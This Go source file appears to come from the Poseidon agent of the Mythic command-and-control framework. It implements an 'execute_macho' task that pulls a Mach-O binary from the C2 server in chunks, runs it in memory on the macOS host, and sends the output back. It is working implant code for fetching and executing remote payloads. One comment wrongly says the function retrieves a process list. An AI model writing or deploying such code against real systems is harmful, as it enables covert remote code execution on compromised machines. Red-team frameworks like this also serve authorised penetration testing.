package execute_macho

import (
	// Standard
	"encoding/json"
	"fmt"

	// Poseidon

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

// initial .c code pulled from https://github.com/djhohnstein/macos_shell_memory

type executeMachoArgs struct {
	FileID       string `json:"file_id"`
	ArgString    string `json:"args"`
}

//Run - interface method that retrieves a process list
func Run(task structs.Task) {
	msg := structs.Response{}
	msg.TaskID = task.TaskID

	args := executeMachoArgs{}

	err := json.Unmarshal([]byte(task.Params), &args)
	if err != nil {
		msg.SetError(fmt.Sprintf("Failed to unmarshal parameters: %s", err.Error()))
		task.Job.SendResponses <- msg
		return
	}
	r := structs.GetFileFromMythicStruct{}
	r.FileID = args.FileID
	r.FullPath = ""
	r.Task = &task
	r.ReceivedChunkChannel = make(chan []byte)
	task.Job.GetFileFromMythic <- r

	fileBytes := make([]byte, 0)

	for {
		newBytes := <-r.ReceivedChunkChannel
		if len(newBytes) == 0 {
			break
		} else {
			fileBytes = append(fileBytes, newBytes...)
		}
	}

	if len(fileBytes) == 0 {
		msg.SetError(fmt.Sprintf("Failed to get file"))
		task.Job.SendResponses <- msg
		return
	}
	var final string
	resp, _ := executeMacho(fileBytes, args.ArgString)
	final = resp.Message
	if len(final) == 0 {
		final = "Macho did not return data"
	}
	msg.Completed = true
	msg.UserOutput = final
	task.Job.SendResponses <- msg
	return
}
